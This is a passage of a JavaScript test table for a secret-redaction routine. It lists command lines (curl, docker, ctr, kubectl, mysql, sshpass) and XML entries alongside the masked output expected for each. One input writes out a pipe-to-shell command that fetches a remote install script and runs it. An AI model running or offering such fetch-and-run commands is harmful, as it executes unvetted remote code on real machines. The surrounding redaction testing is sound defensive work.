  // and the flag, or the start of the text; 200 characters of it are looked at and a longer command is masked. A container client is the FIRST word of the command (sudo, doas, env, time, nohup and
  // VAR=x may come before it; a path and .exe may be on it). What is not known to be a user and a group is masked.
  ['docker run: a user and a group', 'docker run --rm -u node:node -p 8080:80 img', 'docker run --rm -u node:node -p 8080:80 img'],
  ['curl: -u first', `curl -u admin:${V} https://api.example.com/v1`, 'curl -u admin:[REDACTED] https://api.example.com/v1'],
  ['curl: -u last', `curl https://api.example.com/v1 -u admin:${V}`, 'curl https://api.example.com/v1 -u admin:[REDACTED]'],
  ['docker run -u 1000:1000', 'docker run -u 1000:1000 alpine id', 'docker run -u 1000:1000 alpine id'],
  ['docker run --user node:node', 'docker run --user node:node alpine id', 'docker run --user node:node alpine id'],
  ['docker-compose too', 'docker-compose run -u app:app web sh', 'docker-compose run -u app:app web sh'],
  ['docker.exe on Windows', 'docker.exe run --user app:app img', 'docker.exe run --user app:app img'],
  ['a path to docker', '/usr/bin/docker exec -u app:app web sh', '/usr/bin/docker exec -u app:app web sh'],
  ['a Windows path to docker, in capitals', 'C:\\Docker\\DOCKER.EXE run -u app:app img', 'C:\\Docker\\DOCKER.EXE run -u app:app img'],
  ['podman', 'podman run --user app:app img', 'podman run --user app:app img'],
  ['nerdctl', 'nerdctl run --user app:app img', 'nerdctl run --user app:app img'],
  ['buildah', 'buildah run --user app:app ctr sh', 'buildah run --user app:app ctr sh'],
  ['docker compose (the plugin)', 'docker compose run -u app:app web sh', 'docker compose run -u app:app web sh'],
  ['sudo docker run with a user and a group', 'sudo docker run -u node:node alpine id', 'sudo docker run -u node:node alpine id'],
  ['sudo with a flag of its own', 'sudo -E docker run -u node:node alpine id', 'sudo -E docker run -u node:node alpine id'],
  ['doas', 'doas docker run -u node:node alpine id', 'doas docker run -u node:node alpine id'],
  ['env with a variable', 'env FOO=1 docker run -u node:node alpine id', 'env FOO=1 docker run -u node:node alpine id'],
  ['a variable of the command', 'FOO=1 docker run -u node:node alpine id', 'FOO=1 docker run -u node:node alpine id'],
  ['time', 'time docker run -u node:node alpine id', 'time docker run -u node:node alpine id'],
  ['nohup', 'nohup docker run -u node:node alpine id', 'nohup docker run -u node:node alpine id'],
  ['the name of a container client in any case', 'Docker Run -u node:node img', 'Docker Run -u node:node img'],
  ['a prefix in front of the client is a first word that is none, so the group is masked (fail safe): a YAML list item', '- docker run -u node:node img', '- docker run -u node:[REDACTED] img'],
  ['and the prompt of a shell', '$ docker run -u node:node img', '$ docker run -u node:[REDACTED] img'],
  ['and the RUN of a Dockerfile', 'RUN docker run -u node:node img', 'RUN docker run -u node:[REDACTED] img'],
  ['and a comment', '# docker run -u node:node img', '# docker run -u node:[REDACTED] img'],
  ['but blanks in front of it are not a word', '  docker run -u node:node img', '  docker run -u node:node img'],
  ['docker exec with the flag before a curl', 'docker exec -u www-data:www-data web curl http://localhost', 'docker exec -u www-data:www-data web curl http://localhost'],
  ['two flags after one client: both stay', 'docker run -u node:node --user app:app img', 'docker run -u node:node --user app:app img'],
  ['-u of docker is a user and a group, --user too', 'docker run -u 1000:1000 --user node:node img', 'docker run -u 1000:1000 --user node:node img'],
  ['a quoted user and group after docker', 'docker run -u "node:node" img', 'docker run -u "node:node" img'],
  ['docker over several lines (a backslash, a caret, a backtick)', 'docker run \\\n  -e A=1 \\\n  -u node:node \\\n  img', 'docker run \\\n  -e A=1 \\\n  -u node:node \\\n  img'],
  ['and with a caret', 'docker run ^\n  -u node:node ^\n  img', 'docker run ^\n  -u node:node ^\n  img'],
  ['and with a backtick', 'docker run `\n  -u node:node `\n  img', 'docker run `\n  -u node:node `\n  img'],
  ['and with Windows line endings', 'docker run \\\r\n  -u node:node \\\r\n  img', 'docker run \\\r\n  -u node:node \\\r\n  img'],
  ['spaces and a tab after the backslash still continue the line of docker', 'docker run \\ \t \n  -u node:node img', 'docker run \\ \t \n  -u node:node img'],
  ['a space after the backslash still continues the line of docker', 'docker run \\ \n  -u node:node img', 'docker run \\ \n  -u node:node img'],
  ['and a tab', 'docker run \\\t\n  -u node:node img', 'docker run \\\t\n  -u node:node img'],
  ['a continuation right after the name of the client', 'docker\\\n  run -u node:node img', 'docker\\\n  run -u node:node img'],
  ['a continuation of the line counts as one character, whatever its spaces', `docker run \\${' '.repeat(300)}\n  -u node:node img`, `docker run \\${' '.repeat(300)}\n  -u node:node img`],
  ['the second command of a line has its own first word', 'docker pull img; podman run -u node:node img', 'docker pull img; podman run -u node:node img'],
  ['and after && and |', 'docker pull img && docker run -u node:node img | cat', 'docker pull img && docker run -u node:node img | cat'],
  ['the masked text is looked at again for the next rule: a secret masked before docker does not move its flag out of reach', `curl -u "usr:${V}${V}" url; docker run -u node:node img`, 'curl -u "usr:[REDACTED]" url; docker run -u node:node img'],
  // the clients that are not: ctr (containerd) takes -u/--user as the user and the PASSWORD of a registry, and for the others the flag is a login name, a kubeconfig user or a uid
  ['ctr: -u is the user and the password of a registry', `ctr images pull -u admin:${V} registry.example.com/img:1`, 'ctr images pull -u admin:[REDACTED] registry.example.com/img:1'],
  ['ctr --user', `ctr images pull --user admin:${V} registry.example.com/img:1`, 'ctr images pull --user admin:[REDACTED] registry.example.com/img:1'],
  ['sudo ctr -n k8s.io images push --user "user:password"', `sudo ctr -n k8s.io images push --user "admin:${V}" registry.example.com/img:1`, 'sudo ctr -n k8s.io images push --user "admin:[REDACTED]" registry.example.com/img:1'],
  ['skopeo', `skopeo login -u admin:${V} registry.example.test`, 'skopeo login -u admin:[REDACTED] registry.example.test'],
  ['kubectl', `kubectl config set-credentials admin -u admin:${V}`, 'kubectl config set-credentials admin -u admin:[REDACTED]'],
  ['oc', `oc login -u admin:${V} https://api.example.test:6443`, 'oc login -u admin:[REDACTED] https://api.example.test:6443'],
  ['crictl', `crictl pull -u admin:${V} img`, 'crictl pull -u admin:[REDACTED] img'],
  ['lxc', `lxc remote add x 10.0.0.1 --user admin:${V}`, 'lxc remote add x 10.0.0.1 --user admin:[REDACTED]'],
  ['incus', `incus remote add x 10.0.0.1 --user admin:${V}`, 'incus remote add x 10.0.0.1 --user admin:[REDACTED]'],
  ...['skopeo', 'kubectl', 'oc', 'crictl', 'ctr', 'lxc', 'incus'].flatMap((client) => [
    [`${client} run, a subcommand of a container client: not on the list`, `${client} run -u admin:${V} img`, `${client} run -u admin:[REDACTED] img`],
    [`${client} exec`, `${client} exec -u admin:${V} web`, `${client} exec -u admin:[REDACTED] web`],
  ]),
  // a word of a container client in a URL, a host, a path or a header of a curl is no command: the first word of the command is curl
  ['registry media type in a header', `curl -H "Accept: application/vnd.docker.distribution.manifest.v2+json" -u admin:${V} https://registry.example.com/v2/img/manifests/latest`, 'curl -H "Accept: application/vnd.docker.distribution.manifest.v2+json" -u admin:[REDACTED] https://registry.example.com/v2/img/manifests/latest'],
  ['docker in the URL host', `curl https://registry.hub.docker.com/v2/repositories/x -u admin:${V}`, 'curl https://registry.hub.docker.com/v2/repositories/x -u admin:[REDACTED]'],
  ['docker in the URL path', `curl https://example.com/docker -u admin:${V}`, 'curl https://example.com/docker -u admin:[REDACTED]'],
  ['oc as a host label', `curl https://api.oc.company.com/x -u admin:${V}`, 'curl https://api.oc.company.com/x -u admin:[REDACTED]'],
  ['oc in a path', `curl https://example.com/oc/status -u admin:${V}`, 'curl https://example.com/oc/status -u admin:[REDACTED]'],
  ['kubectl in a path', `curl https://example.com/kubectl/x -u admin:${V}`, 'curl https://example.com/kubectl/x -u admin:[REDACTED]'],
  ['podman in a header value', `curl -H 'X-Tool: podman' -u admin:${V} https://example.com`, "curl -H 'X-Tool: podman' -u admin:[REDACTED] https://example.com"],
  ['ctr as a word', `curl -d ctr -u admin:${V} https://example.com`, 'curl -d ctr -u admin:[REDACTED] https://example.com'],
  ['a quoted password after a docker word', `curl https://example.com/docker -u "admin:${V}"`, 'curl https://example.com/docker -u "admin:[REDACTED]"'],
  ['and in single quotes', `curl https://example.com/docker -u 'admin:${V}'`, "curl https://example.com/docker -u 'admin:[REDACTED]'"],
  ['the --user form', `curl https://example.com/docker --user admin:${V}`, 'curl https://example.com/docker --user admin:[REDACTED]'],
  ['the --proxy-user form', `curl https://example.com/docker --proxy-user admin:${V} -x http://proxy:3128`, 'curl https://example.com/docker --proxy-user admin:[REDACTED] -x http://proxy:3128'],
  ['the -u= form', `curl https://example.com/docker -u=admin:${V}`, 'curl https://example.com/docker -u=admin:[REDACTED]'],
  ['CURL in capitals', `CURL https://example.com/docker -u admin:${V}`, 'CURL https://example.com/docker -u admin:[REDACTED]'],
  ['curl.exe', `curl.exe https://example.com/docker -u admin:${V}`, 'curl.exe https://example.com/docker -u admin:[REDACTED]'],
  ['a continued line', `curl https://example.com/docker \\\n  -u admin:${V}`, 'curl https://example.com/docker \\\n  -u admin:[REDACTED]'],
  ['wget with a docker word', `wget https://example.com/docker -u admin:${V}`, 'wget https://example.com/docker -u admin:[REDACTED]'],
  ['a different tool, a docker word in the URL', `http https://example.com/docker -u admin:${V}`, 'http https://example.com/docker -u admin:[REDACTED]'],
  ['a docker command, then a curl after a ;', `docker ps; curl https://example.com -u admin:${V}`, 'docker ps; curl https://example.com -u admin:[REDACTED]'],
  ['a curl after the container client, before the flag: the flag is curl\'s', `docker run alpine curl -u admin:${V} http://x`, 'docker run alpine curl -u admin:[REDACTED] http://x'],
  ['curl inside a docker command: the flag belongs to curl', `docker exec web curl -u admin:${V} http://localhost/api`, `docker exec web curl -u admin:[REDACTED] http://localhost/api`],
  ['and in a shell started by docker', `docker run img sh -c "curl -u admin:${V} http://x"`, `docker run img sh -c "curl -u admin:[REDACTED] http://x"`],
  ['kubectl exec ... -- curl', `kubectl exec pod -- curl --user admin:${V} http://x`, `kubectl exec pod -- curl --user admin:[REDACTED] http://x`],
  ['curlimages/curl: the image is curl', `docker run --rm curlimages/curl -u admin:${V} https://x.example.test`, `docker run --rm curlimages/curl -u admin:[REDACTED] https://x.example.test`],
  ['a URL before the flag of a docker command: the command is not known to be one of containers only', `docker -H tcp://127.0.0.1:2375 run -u node:node img`, `docker -H tcp://127.0.0.1:2375 run -u node:[REDACTED] img`],
  ['a docker command whose flag comes before its URL', `docker run -u node:node https://example.test/x`, `docker run -u node:node https://example.test/x`],
  // the first word of the command is the client, not any word of it
  ['a docker word that is not the first word of the command', `echo docker run -u node:${V} img`, `echo docker run -u node:[REDACTED] img`],
  ['a shell started with a docker command inside', `bash -c 'docker run -u node:${V} img'`, `bash -c 'docker run -u node:[REDACTED] img'`],
  ['a docker word glued to others: nodocker, dockerd, dockerfile, docker2', `nodocker run -u app:${V} x; dockerd run -u app:${V} y; dockerfile run -u app:${V} z; docker2 run -u app:${V} w`, `nodocker run -u app:[REDACTED] x; dockerd run -u app:[REDACTED] y; dockerfile run -u app:[REDACTED] z; docker2 run -u app:[REDACTED] w`],
  ['sudo -u before docker is not a user and a group of docker', `sudo -u root docker run -u node:${V} img`, `sudo -u root docker run -u node:[REDACTED] img`],
  ['a wrapper in capitals', 'SUDO docker run -u node:node img', 'SUDO docker run -u node:node img'],
  ['a continuation between the wrapper and the client (a backslash)', 'sudo \\\n  docker run -u node:node img', 'sudo \\\n  docker run -u node:node img'],
  ['and a caret', 'sudo ^\n  docker run -u node:node img', 'sudo ^\n  docker run -u node:node img'],
  ['and a backtick', 'sudo `\n  docker run -u node:node img', 'sudo `\n  docker run -u node:node img'],
  ['and spaces and a tab after the mark', 'sudo \\ \t \n  docker run -u node:node img', 'sudo \\ \t \n  docker run -u node:node img'],
  ['and a Windows line ending', 'sudo \\\r\n  docker run -u node:node img', 'sudo \\\r\n  docker run -u node:node img'],
  ['and after a flag of the wrapper', 'sudo -E \\\n  docker run -u node:node img', 'sudo -E \\\n  docker run -u node:node img'],
  ['a wrapper, a flag and a variable before the client', 'sudo -E FOO=1 docker run -u node:node img', 'sudo -E FOO=1 docker run -u node:node img'],
  ['a flag in front of the client, with no wrapper before it, is not a wrapper flag: the client is not the first word', '-E docker run -u node:node img', '-E docker run -u node:[REDACTED] img'],
  ['a colon and one slash (a volume) are no URL', 'docker run -v /data:/data -u node:node img', 'docker run -v /data:/data -u node:node img'],
  ['two slashes with no colon before them are no URL either', 'docker run -e A=b//c -u node:node img', 'docker run -e A=b//c -u node:node img'],
  ['a chain of 150 continuations is inside the 200 items of the walk (one each, not two)', `docker ${'\\\n'.repeat(150)}run -u node:node img`, `docker ${'\\\n'.repeat(150)}run -u node:node img`],
  ['and a chain of 300 is outside: the start of the command is not known, the flag is masked', `docker ${'\\\n'.repeat(300)}run -u node:node img`, `docker ${'\\\n'.repeat(300)}run -u node:[REDACTED] img`],
  // the command ends at ; & | and at a line ending that is no continuation
  ['a command after the docker command, on the same line: its -u is masked', `docker pull img; tool -u admin:${V} x`, `docker pull img; tool -u admin:[REDACTED] x`],
  ['and after a pipe', `docker ps | tool -u admin:${V}`, `docker ps | tool -u admin:[REDACTED]`],
  ['and after &&', `docker build . && tool -u admin:${V}`, `docker build . && tool -u admin:[REDACTED]`],
  ['and after a single &', `docker run img & tool -u admin:${V}`, `docker run img & tool -u admin:[REDACTED]`],
  ['and after ||', `docker run img || tool -u admin:${V}`, `docker run img || tool -u admin:[REDACTED]`],
  ['and after the end of a line', `docker run img\n  -u svc:${V}`, `docker run img\n  -u svc:[REDACTED]`],
  ['and after a Windows line ending that does not continue the line', `docker run img\r\n  -u svc:${V}`, `docker run img\r\n  -u svc:[REDACTED]`],
  ['a carriage return alone ends the command', `docker run\r  -u svc:${V} img`, `docker run\r  -u svc:[REDACTED] img`],
  ['and in the middle of a word', `docker run -e A=b\rc -u svc:${V} img`, `docker run -e A=b\rc -u svc:[REDACTED] img`],
  ['a | glued to the words around it ends the command', 'docker run -e A=b|c -u node:node img', 'docker run -e A=b|c -u node:[REDACTED] img'],
  ['and a & glued to them', 'docker run -e A=b&c -u node:node img', 'docker run -e A=b&c -u node:[REDACTED] img'],
  ['and a ;', 'docker run -e A=b;c -u node:node img', 'docker run -e A=b;c -u node:[REDACTED] img'],
  ['a blank line after the backslash ends the command of docker: the -u below it is masked', `docker run \\\n\n  -u svc:${V}`, `docker run \\\n\n  -u svc:[REDACTED]`],
  ['a backslash that is not at the end of its line continues nothing: the -u on the next line is masked', `docker run \\ x\n  -u svc:${V}`, `docker run \\ x\n  -u svc:[REDACTED]`],
  ['a command after the container client with the flag on the line of a curl above it: the line above is another command', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u node:node img', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u node:node img'],
  ['a ; inside quotes between docker and the flag ends the command too (the limit): the flag is masked', "docker run -e 'A=b;c' -u node:node img", "docker run -e 'A=b;c' -u node:[REDACTED] img"],
  ['a docker beyond 200 characters of its -u (the limit): masked', `docker run${' x'.repeat(150)} -u node:node img`, `docker run${' x'.repeat(150)} -u node:[REDACTED] img`],
  // the 200 characters of the command, to the character: from the start of the command to the flag, 200 are looked at and a continuation of the line counts as one
  ['docker, the flag 200 characters from the start of the text: inside', `docker run -e ${'x'.repeat(185)} -u node:node img`, `docker run -e ${'x'.repeat(185)} -u node:node img`],
  ['and 201: outside', `docker run -e ${'x'.repeat(186)} -u node:node img`, `docker run -e ${'x'.repeat(186)} -u node:[REDACTED] img`],
  ['the same from the start of the second command of a line (the ; and the space before docker are not counted)', `a; docker run -e ${'x'.repeat(184)} -u node:node img`, `a; docker run -e ${'x'.repeat(184)} -u node:node img`],
  ['and 201 from it', `a; docker run -e ${'x'.repeat(185)} -u node:node img`, `a; docker run -e ${'x'.repeat(185)} -u node:[REDACTED] img`],
  ['a continuation inside the command counts as one: 200 in all', `docker \\\nrun -e ${'x'.repeat(184)} -u node:node img`, `docker \\\nrun -e ${'x'.repeat(184)} -u node:node img`],
  ['and 201 are out', `docker \\\nrun -e ${'x'.repeat(185)} -u node:node img`, `docker \\\nrun -e ${'x'.repeat(185)} -u node:[REDACTED] img`],
  ['mysql, the -p 200 characters after its name: inside the window', `mysql ${'x'.repeat(198)} -p${V} db`, `mysql ${'x'.repeat(198)} -p[REDACTED] db`],
  ['and 201: outside', `mysql ${'x'.repeat(199)} -p${V} db`, `mysql ${'x'.repeat(199)} -p${V} db`],
  ['docker login, the -p 200 characters after login: inside the window', `docker login ${'x'.repeat(198)} -p ${V} registry.example.test`, `docker login ${'x'.repeat(198)} -p [REDACTED] registry.example.test`],
  ['and 201: outside', `docker login ${'x'.repeat(199)} -p ${V} registry.example.test`, `docker login ${'x'.repeat(199)} -p ${V} registry.example.test`],
  // what is a curl and what is not (the word, in any case): the flag after another word is still the flag of a docker command
  ['xcurl is no curl: the flag after it still follows docker', 'docker exec -e xcurl -u node:node web', 'docker exec -e xcurl -u node:node web'],
  ['curly is no curl either', 'docker exec -e curly -u node:node web', 'docker exec -e curly -u node:node web'],
  ['nor is curl2', 'docker exec -e curl2 -u node:node web', 'docker exec -e curl2 -u node:node web'],
  ['nor is 2curl', 'docker exec -e 2curl -u node:node web', 'docker exec -e 2curl -u node:node web'],
  ['nor is _curl', 'docker exec -e _curl -u node:node web', 'docker exec -e _curl -u node:node web'],
  ['nor is curl_', 'docker exec -e curl_ -u node:node web', 'docker exec -e curl_ -u node:node web'],
  ['CURL is curl in any case', `docker exec -e CURL -u admin:${V} web`, `docker exec -e CURL -u admin:[REDACTED] web`],
  ['curl.exe is curl', `docker exec -e curl.exe -u admin:${V} web`, `docker exec -e curl.exe -u admin:[REDACTED] web`],
  ['a flag at the start of the text, after a line ending', `\n  -u svc:${V}`, `\n  -u svc:[REDACTED]`],
  ['a quoted user and password in a text of curl', `curl -u "admin:${V}" x`, 'curl -u "admin:[REDACTED]" x'],
  ['and the other way: a client that is nearer but behind a ; leaves the flag masked', `podman ps; tool -u svc:${V}`, `podman ps; tool -u svc:[REDACTED]`],
  ['two flags of one curl: both are masked', `curl --proxy-user proxy:${V} -u admin:${V} https://example.com`, 'curl --proxy-user proxy:[REDACTED] -u admin:[REDACTED] https://example.com'],
  ['curl.exe, as Windows spells it', `curl.exe -u admin:${V} https://example.com`, 'curl.exe -u admin:[REDACTED] https://example.com'],
  ['a curl within 200 characters of its -u', `curl${' x'.repeat(75)} -u admin:${V} url`, `curl${' x'.repeat(75)} -u admin:[REDACTED] url`],
  ['a curl beyond 200 characters of its -u: masked all the same', `curl${' x'.repeat(150)} -u admin:${V} url`, `curl${' x'.repeat(150)} -u admin:[REDACTED] url`],
  ['whatever the program is, its -u is a user and a password: notcurl and curly too', `notcurl -u admin:${V} x; curly -u admin:${V} y`, `notcurl -u admin:[REDACTED] x; curly -u admin:[REDACTED] y`],
  // a numeric pair is a user id and a group id, wherever it stands, unless the command holds a curl or a URL before the flag
  ['a numeric pair is a user id and a group id, wherever it stands', 'tool -u 1000:1000 x', 'tool -u 1000:1000 x'],
  ['and in quotes', 'tool -u "1000:1000" x', 'tool -u "1000:1000" x'],
  ['and with --user=', 'tool --user=1000:1000 x', 'tool --user=1000:1000 x'],
  ['a numeric user and a password that is not numeric', `tool -u 1000:${V} x`, 'tool -u 1000:[REDACTED] x'],
  ['a user and a password of digits', `tool -u admin:12345678 x`, 'tool -u admin:[REDACTED] x'],
  ['a numeric pair followed by more is not a numeric pair', 'tool -u 1000:1000abc x', 'tool -u 1000:[REDACTED] x'],
  ['and a long numeric user', 'tool -u 12345678901:1000 x', 'tool -u 12345678901:[REDACTED] x'],
  ['a numeric pair of ten digits and ten digits is one', 'tool -u 1234567890:1234567890 x', 'tool -u 1234567890:1234567890 x'],
  ['eleven digits for the group is not', 'tool -u 1:12345678901 x', 'tool -u 1:[REDACTED] x'],
  ['a quoted pair that goes on after its digits is not numeric', 'tool -u "1000:1000abc" x', 'tool -u "1000:[REDACTED]" x'],
  ['a numeric user and a numeric password of a curl are a user and a password', `curl -u 5551234567:123456 https://example.com`, `curl -u 5551234567:[REDACTED] https://example.com`],
  ['and in quotes', `curl -u "5551234567:123456" https://example.com`, `curl -u "5551234567:[REDACTED]" https://example.com`],
  ['and a curl above, on the continued line', `curl https://example.com \\\n  -u 5551234567:123456`, `curl https://example.com \\\n  -u 5551234567:[REDACTED]`],
  ['a numeric pair after a URL is a user and a password too', `wget https://example.com/f -u 5551234567:123456`, `wget https://example.com/f -u 5551234567:[REDACTED]`],
  ['a numeric pair after a docker command with a curl in it', `docker run alpine curl -u 5551234567:123456 http://x`, `docker run alpine curl -u 5551234567:[REDACTED] http://x`],
  ['a numeric pair in a docker command with a curl after the flag', `docker exec -u 1000:1000 web curl http://localhost`, `docker exec -u 1000:1000 web curl http://localhost`],
  ['a numeric pair after a command of 200 characters or more: masked (it is not known what the command is)', `tool ${'x'.repeat(250)} -u 1000:1000 y`, `tool ${'x'.repeat(250)} -u 1000:[REDACTED] y`],
  // not a user and a password: a path with a drive letter, a push, a sort
  ['diff -u with a Windows path', 'diff -u C:\\a\\old.txt C:\\a\\new.txt', 'diff -u C:\\a\\old.txt C:\\a\\new.txt'],
  ['and with slashes', 'diff -u C:/a/old.txt C:/a/new.txt', 'diff -u C:/a/old.txt C:/a/new.txt'],
  ['and in quotes', 'diff -u "C:\\a\\old.txt" "C:\\a\\new.txt"', 'diff -u "C:\\a\\old.txt" "C:\\a\\new.txt"'],
  ['a user of one letter and a password is a user and a password', `curl -u c:${V} https://example.com`, 'curl -u c:[REDACTED] https://example.com'],
  ['a user of two letters is no drive: the password that starts with a slash is masked', `curl -u ab:/${V} https://example.com`, 'curl -u ab:[REDACTED] https://example.com'],
  ['and the same with no curl in the command: two letters are a user, not a drive', `tool -u ab:/${V} x`, 'tool -u ab:[REDACTED] x'],
  ['a digit before the colon and a slash is no drive: the password is masked', `tool -u 7:/${V} x`, 'tool -u 7:[REDACTED] x'],
  ['a drive letter in small letters, with a backslash or a slash, is a path as well', 'diff -u c:\\a\\old.txt c:/a/new.txt', 'diff -u c:\\a\\old.txt c:/a/new.txt'],
  ['a drive letter and a slash after a curl is a user and a password: the command decides, not the shape', `curl -u c:/${V} https://example.com`, 'curl -u c:[REDACTED] https://example.com'],
  ['and with a backslash', `curl.exe -u C:\\${V} https://example.com`, 'curl.exe -u C:[REDACTED] https://example.com'],
  ['and in quotes', `curl -u "c:/${V}" https://example.com`, 'curl -u "c:[REDACTED]" https://example.com'],
  ['and when the URL stands before the flag', `wget https://example.com -u c:/${V}`, 'wget https://example.com -u c:[REDACTED]'],
  ['a drive path in a command with no curl and no URL is a path', 'diff -u c:/a/old.txt c:/a/new.txt', 'diff -u c:/a/old.txt c:/a/new.txt'],
  ['docker exec -u www-data:www-data web sh', 'docker exec -u www-data:www-data web sh', 'docker exec -u www-data:www-data web sh'],
  ['git push -u', 'git push -u origin main', 'git push -u origin main'],
  ['git push -u with a refspec', 'git push -u origin HEAD:main', 'git push -u origin HEAD:main'],
  ['sort -u', 'sort -u a.txt b.txt', 'sort -u a.txt b.txt'],
  ['a flag at the very start of the text', `-u svc:${V} x`, `-u svc:[REDACTED] x`],
  ['-p is the password of mysql and -P is its port', `mysql -h h -P3306 -u root -p${V} db`, 'mysql -h h -P3306 -u root -p[REDACTED] db'],
  ['-P of mysql in quotes is a port too', 'mysql -h h -P"3306" db', 'mysql -h h -P"3306" db'],
  ['-P after sshpass is the prompt it waits for, in quotes as well', "sshpass -P 'assword' ssh host", "sshpass -P 'assword' ssh host"],
  ['-P after docker login is no password', 'docker login -P 5000 registry.example.test', 'docker login -P 5000 registry.example.test'],
  ['and in quotes', "docker login -P '5000' registry.example.test", "docker login -P '5000' registry.example.test"],
  ['a long flag in capitals is a flag', `tool --PASSWORD ${V} run`, 'tool --PASSWORD [REDACTED] run'],
  ['and with its value in quotes', `tool --Token "${V}" run`, 'tool --Token "[REDACTED]" run'],
  ['of two -p of mysql the first is the one that is masked (the gap is lazy)', 'mysql -psecret1 db -e x -pfoo', 'mysql -p[REDACTED] db -e x -pfoo'],
  ['and of docker login', `docker login -p ${V} registry.example.test -p foo`, 'docker login -p [REDACTED] registry.example.test -p foo'],
  ['a -p within 200 characters of docker login', `docker login${' x'.repeat(75)} -p ${V} registry.example.test`, `docker login${' x'.repeat(75)} -p [REDACTED] registry.example.test`],
  ['a -p beyond 200 characters of docker login (the limit)', `docker login${' x'.repeat(150)} -p ${V} registry.example.test`, `docker login${' x'.repeat(150)} -p ${V} registry.example.test`],
  ['an empty value in quotes', 'tool --password "" run', 'tool --password "" run'],
  ['a long option that holds the letters -p', 'mysql --protocol=tcp -u root', 'mysql --protocol=tcp -u root'],
  ['another one in the middle of a word', 'mysqldump --set-gtid-purged=OFF mydb', 'mysqldump --set-gtid-purged=OFF mydb'],
  ['an option of docker login that ends in -p', 'docker login --dry-p value registry.example.test', 'docker login --dry-p value registry.example.test'],
  ['a -u glued to a word is no flag', 'foo-u bar:bazqux', 'foo-u bar:bazqux'],
  ['several spaces between the flag and its value are still the flag', `curl -u  admin:${V} url`, 'curl -u  admin:[REDACTED] url'],
  ['and a tab, and an equals sign', `curl -u\tadmin:${V} --user=svc:${V} url`, 'curl -u\tadmin:[REDACTED] --user=svc:[REDACTED] url'],
  ['and neither is one after curl', `curl x-u admin:${V} url`, `curl x-u admin:${V} url`],
  ['a long flag glued to a word is no flag', 'a--password Hunter2Only', 'a--password Hunter2Only'],
  ['a password read from the environment, in quotes', 'sshpass -p "$SSHPASS" ssh host', 'sshpass -p "$SSHPASS" ssh host'],
  ['a user and a password read from the environment', 'curl -u $USER:$PASS https://example.com', 'curl -u $USER:$PASS https://example.com'],
  ['a password read from the environment in the quotes of curl -u', 'curl -u "admin:$PASSWORD" https://example.com', 'curl -u "admin:$PASSWORD" https://example.com'],
  ['a user read from the environment and a password that is not', `curl -u $USER:${V} https://example.com`, 'curl -u $USER:[REDACTED] https://example.com'],
  ['curl -u with a URL', 'curl -u https://example.com', 'curl -u https://example.com'],
  ['a password of 1500 characters in quotes', `deploy --password '${'ab c '.repeat(300)}' --env prod`, "deploy --password '[REDACTED]' --env prod"],
  ['a value of three characters is a word, not a password', 'tool --token abc run', 'tool --token abc run'],
  ['a value of four is', 'tool --token abcd run', 'tool --token [REDACTED] run'],
  ['--user= and a bare value', `curl --user=admin:${V} https://example.com`, 'curl --user=admin:[REDACTED] https://example.com'],
  ['--proxy-user, and a proxy that is not a user', `curl --proxy-user proxy:${V} -x host:8080 https://example.com`, 'curl --proxy-user proxy:[REDACTED] -x host:8080 https://example.com'],
  ['a longer flag name that starts with a password flag', 'tool --passwordfile /run/secrets/pw', 'tool --passwordfile /run/secrets/pw'],
  ['a program that only starts like a client of MySQL', `mysqlfoo -u root -p${V} db`, `mysqlfoo -u root -p${V} db`],
  ['a program that ends like one', `notmysql -u root -p${V} db`, `notmysql -u root -p${V} db`],
  ['a short password glued to -p', 'mysql -u root -pab db', 'mysql -u root -p[REDACTED] db'],
  ['a short password after sshpass -p', 'sshpass -p ab ssh host', 'sshpass -p [REDACTED] ssh host'],
  ['another flag after a flag that takes a password', 'tool --password --verbose run', 'tool --password --verbose run'],
  ['curl -u with a URL in quotes', 'curl -u "https://example.com" x', 'curl -u "https://example.com" x'],
  ['a Windows variable as the value of a flag', 'tool --password %DB_PASSWORD% run', 'tool --password %DB_PASSWORD% run'],
  ['a quoted value that starts with a dash is a password', `tool --password "-${V}" run`, 'tool --password "[REDACTED]" run'],
  ['an entry whose key goes on after the word', `<add key="ApiKeyHeader" value="${V}"/>`, '<add key="ApiKeyHeader" value="[REDACTED]"/>'],
  ['an empty XML element, a short one, and one closed by another name', '<password></password><password>abc</password><password>abcdef</token>', '<password></password><password>abc</password><password>abcdef</token>'],
  ['placeholders in XML', '<password>your-password</password><password>********</password><password>%DB_PASSWORD%</password><password><![CDATA[x]]></password>', '<password>your-password</password><password>********</password><password>%DB_PASSWORD%</password><password><![CDATA[x]]></password>'],
  ['an entry with a read, a short value, and a key that is not a secret', '<add key="ApiKey" value="%API_KEY%" /><add key="ApiKey" value="abc" /><add key="Mode" value="x-long-value"/>', '<add key="ApiKey" value="%API_KEY%" /><add key="ApiKey" value="abc" /><add key="Mode" value="x-long-value"/>'],
  ['a key with a prefix, an entry named by name=, a value in single quotes', `<add key="DefaultAdminPassword" value="${V}"/><add name="password" value="${V}"/><add key="Password" value='${V}'/>`, '<add key="DefaultAdminPassword" value="[REDACTED]"/><add name="password" value="[REDACTED]"/><add key="Password" value=\'[REDACTED]\'/>'],
  // The 200 items of the walk when the 200th item is a LINE ENDING that continues the line (a backslash, then the line ending): the continued branch of commandStart has its own check, and it is pinned at 199,
  // 200 and 201 like the plain one. The text starts with the continuation, so the command starts at the start of the text (or, behind a ;, right after the line ending).
  ['a continued line whose line ending is the 199th item: the start of the command is found, the flag is the flag of docker', `\\\ndocker run -e ${'x'.repeat(184)} -u node:node img`, `\\\ndocker run -e ${'x'.repeat(184)} -u node:node img`],
  ['and the 200th item: outside the window, the flag is masked', `\\\ndocker run -e ${'x'.repeat(185)} -u node:node img`, `\\\ndocker run -e ${'x'.repeat(185)} -u node:[REDACTED] img`],
  ['and the 201st item (a plain character): outside as well', `\\\ndocker run -e ${'x'.repeat(186)} -u node:node img`, `\\\ndocker run -e ${'x'.repeat(186)} -u node:[REDACTED] img`],
  ['behind a separator the start is the item after the line ending: found at 199 ...', `a;\\\ndocker run -e ${'x'.repeat(184)} -u node:node img`, `a;\\\ndocker run -e ${'x'.repeat(184)} -u node:node img`],
  ['... and masked at 200', `a;\\\ndocker run -e ${'x'.repeat(185)} -u node:node img`, `a;\\\ndocker run -e ${'x'.repeat(185)} -u node:[REDACTED] img`],
  ['a numeric pair after a start that is found is a user id and a group id (the line ending is the 199th item)', `\\\ndocker ${'x'.repeat(191)} -u 1000:1000 img`, `\\\ndocker ${'x'.repeat(191)} -u 1000:1000 img`],
